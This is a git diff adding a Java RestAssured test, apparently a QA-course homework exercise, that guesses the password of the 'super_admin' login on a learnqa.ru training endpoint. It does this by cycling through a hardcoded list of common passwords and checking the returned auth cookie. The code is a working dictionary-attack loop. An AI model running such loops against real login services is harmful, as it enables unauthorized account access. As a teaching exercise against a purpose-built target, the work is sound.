@@ -3,6 +3,8 @@ import io.restassured.path.json.JsonPath;
 import io.restassured.response.Response;
 import org.junit.jupiter.api.Test;
 
+import java.util.HashMap;
+import java.util.Map;
 
 
 public class HelloWorldTest {
@@ -90,4 +92,43 @@ public class HelloWorldTest {
         }
 
     }
+    // ex:9 Подбор пароля
+    @Test
+    public void testPasswordSelection (){
+
+        String[] passwords= {"123456","qwerty","password","123456789","1234567","12345678","12345","iloveyou","111111","123123","abc123","qwerty123","1q2w3e4r","admin","qwertyuiop","654321","555555","lovely","7777777","welcome","888888","princess","dragon","password1","123qwe"};
+        Map<String, String> cookies = new HashMap<>();
+        Map<String, String> data = new HashMap<>();
+        data.put("login","super_admin");
+        int i = 0;
+        String resAuth = "";
+        String responseCookie = "";
+        do{
+            data.put("password",passwords[i]);
+            Response responseForGet = RestAssured
+                    .given()
+                    .body(data)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/get_secret_password_homework")
+                    .andReturn();
+            responseCookie = responseForGet.getCookie("auth_cookie");
+            cookies.put("auth_cookie",responseCookie);
+
+            Response responseForCheck = RestAssured
+                    .given()
+                    .body(data)
+                    .cookies(cookies)
+                    .when()
+                    .post("https://playground.learnqa.ru/ajax/api/check_auth_cookie")
+                    .andReturn();
+            resAuth = responseForCheck.getBody().asString();
+
+            if (resAuth.equals("You are authorized")){
+                break;
+            }
+            i++;
+        } while (true);
+        System.out.println("Password found: "+passwords[i]);
+    }
+
 }
